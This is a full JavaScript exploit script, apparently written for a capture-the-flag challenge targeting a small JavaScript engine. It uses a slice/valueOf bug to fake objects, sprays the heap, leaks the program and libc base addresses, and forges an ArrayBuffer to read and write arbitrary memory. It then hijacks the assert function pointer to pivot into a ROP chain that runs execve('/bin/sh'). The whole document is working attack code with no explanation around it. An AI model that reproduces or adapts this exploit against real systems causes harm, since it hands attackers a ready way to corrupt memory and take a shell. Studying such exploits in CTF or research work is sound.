function fakeFloat64(addr) {
    var a = [];
    for (var i = 0; i < 100; i++) {
        a.push(0);
    }
    
    var b = a.slice(12, {valueOf: function() {
            a.length = 5;
            r = new ArrayBuffer(320);
            var w = new Uint32Array(r);
            w[0] = (addr << 3 ) | 2;
            return 13;
        }
    });
    return b.pop()
}

function fakeObj(addr) {
    var a = [];
    for (var i = 0; i < 100; i++) {
        a.push(0);
    }
    
    var b = a.slice(12, {valueOf: function() {
            a.length = 5;
            r = new ArrayBuffer(320);
            var w = new Uint32Array(r);
            w[0] = (addr << 3 ) | 3;
            return 13;
        }
    });
    return b.pop();
}

function f64_to_hex(f64v) {
    var x = new Float64Array(1);
    var y = new Uint8Array(x.buffer);
    x[0] = f64v;
    var hex_res = "0x";
    for (var i = 7; i > -1; i--) {
        hex_res += y[i].toString(16).padStart(2, "0");
    }
    return hex_res;
}

function f64_to_bigint(f64v) {
    return BigInt(f64_to_hex(f64v))
}

function f64_to_u32(f64v) {
    var x = new Float64Array(1);
    var y = new Uint32Array(x.buffer);
    x[0] = f64v;
    return y[0]
}

function num_to_f64(numv) {
    let f64 = new Float64Array(1);
    let u8 = new Uint8Array(f64.buffer);
    u8[0] = shift(numv, 0) & 0xFF;
    u8[1] = shift(numv, 8) & 0xFF;
    u8[2] = shift(numv, 16) & 0xFF;
    u8[3] = shift(numv, 24) & 0xFF;
    u8[4] = shift(numv, 32) & 0xFF;
    u8[5] = shift(numv, 40) & 0xFF;
    u8[6] = shift(numv, 48) & 0xFF;
    u8[7] = shift(numv, 56) & 0xFF;
    return f64[0];
}

function string_to_ascii_array(strv) {
    var rv = [];
    for (var i = 0; i < strv.length; i++) {
        rv.push(strv[i].charCodeAt(0));
    }
    return rv;
}

function shift(number, shift) {
    return number / Math.pow(2, shift);
}

var needle = new Uint8Array(8);
var needle_f = new Float64Array(needle.buffer);

var haystack = new Uint8Array(0x40000);

for (var i = 0; i < haystack.length; i+= 8) {
    needle_f[0] = i;
    haystack.set(needle, i);
}

let a = fakeFloat64(0x5000);
let find_index = Math.floor(a);
if (find_index >= 0x40000) {
    print("[-] Exploit failed: heapspray needle not found");
    throw "fail";
}

let leak = fakeFloat64(42);
// for some reason, printing this causes exploit to fail
let pie_base = parseInt(f64_to_hex(leak), 16) - 0x00A9AA;
let got_free = parseInt(f64_to_hex(leak), 16) - 0x00A9AA + 0x6BDE0;

// now let's leak libc
var idx = find_index;
//recipe for arraybuffer class
haystack[idx++] = 0x1;
haystack[idx++] = 0x0;  

haystack[idx++] = 0x11;
haystack[idx++] = 0x22;

haystack[idx++] = 0x33;
haystack[idx++] = 0x44;

haystack[idx++] = 0x55;
haystack[idx++] = 0x66;

// specific parts for arraybyffer

// 1. type of class
haystack[idx++] = 0x18;

// 2. ArrayBuffer flags. (2 is detached, 1 is external memory)
haystack[idx++] = 0x1;
haystack[idx++] = 0x00;

// 3. meainingless
haystack[idx++] = 0x00;

// 4. length
haystack[idx++] = 0xf0;
haystack[idx++] = 0xff;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;

// external buffer
let old_idx = idx;
haystack[idx++] = shift(got_free, 0) & 0xFF;
haystack[idx++] = shift(got_free, 8) & 0xFF;
haystack[idx++] = shift(got_free, 16) & 0xFF;
haystack[idx++] = shift(got_free, 24) & 0xFF;
haystack[idx++] = shift(got_free, 32) & 0xFF;
haystack[idx++] = shift(got_free, 40) & 0xFF;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;

print("[*] PIE: " + pie_base.toString(16));
var fo = fakeObj(0x5000);
var arw = new Float64Array(fo);
let libc_free = parseInt(f64_to_hex(arw[0]), 16);
// values here are libc dependent


// remote version
let libc_base = libc_free - 0x97740;
let libc_execve = libc_base + 0xdddb0;
let environ_ptr = libc_base + 0x1e45a0;
// 0x000000000005e735 : add rsp, 0x450 ; pop rbp ; ret
let stack_pivot_gadget = libc_base + 0x5e735;
/*
// local version
let libc_base = libc_free - 0x9d850;
let libc_execve = libc_base + 0xe62f0;
let environ_ptr = libc_base + 0x1ef2e0;
// 0x000000000005e735 : add rsp, 0x450 ; pop rbp ; ret
let stack_pivot_gadget = libc_base + 0x5e735;
*/
print("[*] LIBC: " + libc_base.toString(16));

// Find function pointer of assert
let assert_ptr = pie_base + 0xa9aa;
let heap_base = pie_base + 0x6D188;
var address = heap_base;
var found = false;


for (var i = 0; i < 0x8000; i++) {
    address = heap_base + i;
    idx = old_idx;
    haystack[idx++] = shift(address, 0) & 0xFF;
    haystack[idx++] = shift(address, 8) & 0xFF;
    haystack[idx++] = shift(address, 16) & 0xFF;
    haystack[idx++] = shift(address, 24) & 0xFF;
    haystack[idx++] = shift(address, 32) & 0xFF;
    haystack[idx++] = shift(address, 40) & 0xFF;
    haystack[idx++] = 0x00;
    haystack[idx++] = 0x00;
    let rv = parseInt(f64_to_hex(arw[0]), 16);
    if (rv == assert_ptr) {
        found = true;
        print("[+] found assert pointer at: " + address.toString(16));
        break;
    }
}

if (!found) {
    print("[-] Exploit failed: could not find createRealm pointer");
    throw "fail";
}

// now overwrite assert pointer
idx = old_idx;
haystack[idx++] = shift(address, 0) & 0xFF;
haystack[idx++] = shift(address, 8) & 0xFF;
haystack[idx++] = shift(address, 16) & 0xFF;
haystack[idx++] = shift(address, 24) & 0xFF;
haystack[idx++] = shift(address, 32) & 0xFF;
haystack[idx++] = shift(address, 40) & 0xFF;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;
arw[0] = num_to_f64(stack_pivot_gadget);

// leak stack from environ
idx = old_idx;
haystack[idx++] = shift(environ_ptr, 0) & 0xFF;
haystack[idx++] = shift(environ_ptr, 8) & 0xFF;
haystack[idx++] = shift(environ_ptr, 16) & 0xFF;
haystack[idx++] = shift(environ_ptr, 24) & 0xFF;
haystack[idx++] = shift(environ_ptr, 32) & 0xFF;
haystack[idx++] = shift(environ_ptr, 40) & 0xFF;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;
let environ = parseInt(f64_to_hex(arw[0]), 16);
let stack_addr = environ - 0x100;
print("[*] stack_addr: " + stack_addr.toString(16));

// place a rop chain on stack_addr
idx = old_idx;
haystack[idx++] = shift(stack_addr, 0) & 0xFF;
haystack[idx++] = shift(stack_addr, 8) & 0xFF;
haystack[idx++] = shift(stack_addr, 16) & 0xFF;
haystack[idx++] = shift(stack_addr, 24) & 0xFF;
haystack[idx++] = shift(stack_addr, 32) & 0xFF;
haystack[idx++] = shift(stack_addr, 40) & 0xFF;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;

let stack_pivot_code = pie_base + 0x701a;
for (var i = 0; i < 0x100; i++) {
    arw[i] = num_to_f64(stack_pivot_code)
}
var idx = 0x100;
let pop_rdi_ret = pie_base + 0x9447;
let pop_rsi_ret = pie_base + 0xbd46;
let pop_rdx_ret = pie_base + 0x9974;
let cmd_offset = 0x120*8;
let cmd_addr = stack_addr +cmd_offset; 
arw[idx++] = num_to_f64(pop_rdi_ret);
arw[idx++] = num_to_f64(cmd_addr);
arw[idx++] = num_to_f64(pop_rsi_ret);
arw[idx++] = num_to_f64(0);
arw[idx++] = num_to_f64(pop_rdx_ret);
arw[idx++] = num_to_f64(0);
arw[idx++] = num_to_f64(libc_execve);

// place /bin/sh
arw_u8 = new Uint8Array(arw.buffer);
let ascii_array = string_to_ascii_array("/bin/sh\x00");
arw_u8.set(ascii_array, cmd_offset);

// trigger assert to pivot stack into rop chain
assert("Hello world");